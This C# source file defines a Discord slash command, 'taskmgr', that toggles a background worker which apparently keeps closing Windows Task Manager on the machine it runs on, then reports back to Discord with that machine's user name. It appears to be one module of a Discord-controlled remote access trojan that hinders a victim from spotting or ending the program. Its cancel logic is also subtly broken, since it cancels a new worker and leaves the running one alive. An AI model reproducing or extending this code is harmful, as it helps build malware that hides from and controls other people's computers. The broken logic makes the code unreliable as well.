using System.ComponentModel;
using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;

namespace Paroxysm.Discord.Commands;

public class TaskManagerCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "taskmgr",
            Description = "Uruchamia/Wyłącza zamykanie menadżera zadań"
        };
    }


    public Embed Execute(SocketSlashCommand slashCommand)
    {
        Settings.TaskmgrClosed = !Settings.TaskmgrClosed;
        BackgroundWorker backgroundWorker = new();
        backgroundWorker.WorkerSupportsCancellation = true;

        if (!Settings.TaskmgrClosed)
        {
            backgroundWorker.CancelAsync();

            return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
                "Task manager thread has been closed.", Environment.UserName, null);
        }

        backgroundWorker.DoWork += TaskManagerAction.Follow;
        backgroundWorker.RunWorkerAsync();

        return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
            "Task manager thread has been initialized.", Environment.UserName, null);
    }
}